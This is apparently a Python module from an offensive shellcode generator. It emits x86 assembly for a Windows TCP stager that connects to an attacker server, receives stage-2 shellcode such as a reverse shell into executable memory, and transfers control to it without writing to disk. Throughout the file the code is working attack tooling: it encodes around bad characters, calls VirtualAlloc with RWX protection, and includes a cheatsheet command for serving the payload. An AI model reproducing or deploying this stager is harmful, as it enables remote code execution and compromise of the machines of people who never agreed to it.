"""TCP stager payload template - stage 1 of a multi-stage chain.

Downloads stage 2 shellcode from the attacker server into executable memory
and transfers control to it. Never touches disk.

Protocol (server speaks first):
  [4 bytes LE] stage2_size
  [stage2_size bytes] raw shellcode bytes

Framing mode: minimal. The four-byte size header is requested with one recv()
call to reduce emitted size. TCP may return a short header, so this template is
intended only for controlled lab links and is not a reliable transport mode.

Stage 2 is a separate emitter build (e.g. reverse_shell or copy_then_run)
assembled to .bin and served immediately after the 4-byte length header.

Template sequence:
  WSAStartup -> WSASocketA -> connect -> recv(4) -> VirtualAlloc(RWX) ->
  recv loop -> closesocket -> call stage2

Required functions: LoadLibraryA, WSAStartup, WSASocketA, connect, recv,
                    closesocket, VirtualAlloc
Required variables: socket_handle, virt_buf, bytes_total, bytes_recvd
"""
from __future__ import annotations

import socket
import struct

from .base import PayloadTemplate, TemplateConfig
from ..encode import (
    encode_dword, encode_word, safe_push_word_as_dword, safe_push_dword,
    safe_push_imm, safe_word_store, safe_dword_store,
    encode_byte,
    safe_lea, safe_mem_load, safe_mem_store,
    safe_push_mem, safe_call_mem,
    safe_add_from_mem, safe_sub_from_mem, safe_add_to_mem, safe_cmp_with_mem,
)


class TcpStagerTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        ip_le   = struct.unpack("<I", socket.inet_aton(config.lhost))[0]
        port_be = socket.htons(config.lport)
        bc = config.badchars

        wsa_start_off = -layout.slot("WSAStartup").offset
        wsa_sock_off  = -layout.slot("WSASocketA").offset
        conn_off      = -layout.slot("connect").offset
        recv_fn_off   = -layout.slot("recv").offset
        closesk_off   = -layout.slot("closesocket").offset
        valloc_off    = -layout.slot("VirtualAlloc").offset

        sock_h_off      = -layout.slot("socket_handle").offset
        virt_buf_off    = -layout.slot("virt_buf").offset
        bytes_total_off = -layout.slot("bytes_total").offset
        bytes_recvd_off = -layout.slot("bytes_recvd").offset

        wsadata_off  = -layout.slot("WSADATA").offset
        sockaddr_off = -layout.slot("sockaddr_in").offset

        return "\n".join([
            "; -- TCP Stager (stage 1) --",
            f"; Server: {config.lhost}:{config.lport}",
            "; Protocol: [uint32 LE size][raw stage-2 shellcode]",
            "; Framing: minimal (single recv for size header; lab use only)",
            "",
            "    ; WSAStartup(0x0202, &WSADATA)",
            *safe_lea("esi", "ebp", wsadata_off, bc),
            "    push esi",
            *safe_push_word_as_dword(0x0202, bc),
            *safe_call_mem("ebp", wsa_start_off, bc),
            "",
            "    ; WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, 0, 0, 0)",
            "    xor  eax, eax",
            "    push eax",
            "    push eax",
            "    push eax",
            "    mov  al, 0x6",
            "    push eax                    ; IPPROTO_TCP",
            "    sub  al, 0x5",
            "    push eax                    ; SOCK_STREAM",
            "    inc  eax",
            "    push eax                    ; AF_INET",
            *safe_call_mem("ebp", wsa_sock_off, bc),
            *safe_mem_store("ebp", sock_h_off, "eax", bc),
            "",
            "    ; sockaddr_in: sin_port and sin_addr",
            *safe_lea("edi", "ebp", sockaddr_off, bc),
            "    xor  eax, eax",
            *encode_word(port_be, bc, "ax"),
            *safe_word_store("edi", 0x02, "ax", bc, tmp="ecx"),
            "    ; sin_port (big-endian)",
            *encode_dword(ip_le, bc, "eax"),
            *safe_dword_store("edi", 0x04, "eax", bc, tmp="ecx"),
            "    ; sin_addr (network order)",
            "",
            "    ; connect(socket, &sockaddr_in, 0x10)",
            *safe_lea("eax", "ebp", sockaddr_off, bc),
            *safe_push_imm(0x10, bc),
            "    push eax",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", conn_off, bc),
            "",
            "    ; recv(socket, &bytes_total, 4, 0) - read stage-2 size",
            "    xor  eax, eax",
            *safe_lea("ecx", "ebp", bytes_total_off, bc),
            "    push eax",
            *safe_push_imm(4, bc),
            "    push ecx",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", recv_fn_off, bc),
            "",
            "    ; VirtualAlloc(NULL, bytes_total, MEM_COMMIT|MEM_RESERVE,",
            "    ;              PAGE_EXECUTE_READWRITE)",
            *_emit_page_rwx(bc),
            *safe_push_dword(0x3000, bc),
            "    ; MEM_COMMIT|MEM_RESERVE = 0x3000",
            *safe_push_mem("ebp", bytes_total_off, bc),
            "    xor  eax, eax",
            "    push eax                    ; lpAddress = NULL",
            *safe_call_mem("ebp", valloc_off, bc),
            *safe_mem_store("ebp", virt_buf_off, "eax", bc),
            "",
            "    ; initialise bytes_recvd = 0",
            "    xor  eax, eax",
            *safe_mem_store("ebp", bytes_recvd_off, "eax", bc),
            "",
            "stage1_recv_loop:",
            *safe_mem_load("eax", "ebp", virt_buf_off, bc),
            *safe_add_from_mem("eax", "ebp", bytes_recvd_off, bc),
            *safe_mem_load("ecx", "ebp", bytes_total_off, bc),
            *safe_sub_from_mem("ecx", "ebp", bytes_recvd_off, bc),
            "    xor  ebx, ebx",
            "    push ebx                    ; flags = 0",
            "    push ecx                    ; len = remaining",
            "    push eax                    ; buf = virt_buf + bytes_recvd",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", recv_fn_off, bc),
            "    test eax, eax",
            "    jle  stage1_recv_done",
            *safe_add_to_mem("ebp", bytes_recvd_off, "eax", bc),
            *safe_mem_load("eax", "ebp", bytes_recvd_off, bc),
            *safe_cmp_with_mem("eax", "ebp", bytes_total_off, bc),
            "    jl   stage1_recv_loop",
            "",
            "stage1_recv_done:",
            "    ; closesocket - stage 2 opens its own connection if needed",
            *safe_push_mem("ebp", sock_h_off, bc),
            *safe_call_mem("ebp", closesk_off, bc),
            "",
            "    ; transfer control to stage 2",
            *safe_call_mem("ebp", virt_buf_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Serve stage-2 shellcode",
             f"python3 Tools/tcp_stage_server.py --port {config.lport} --file emitter_out/bin/shellcode.bin"),
            ("Protocol", "[4 bytes LE size][raw stage-2 shellcode bytes]"),
        ]


def _emit_page_rwx(badchars: set[int]) -> list[str]:
    """Emit badchar-safe push of PAGE_EXECUTE_READWRITE (0x40)."""
    if 0x40 not in badchars:
        return [
            "    xor  eax, eax",
            "    mov  al, 0x40",
            "    push eax                    ; PAGE_EXECUTE_READWRITE = 0x40",
        ]
    lines = ["    xor  eax, eax"]
    lines.extend(encode_byte(0x40, badchars, "al"))
    lines.append("    push eax                    ; PAGE_EXECUTE_READWRITE")
    return lines
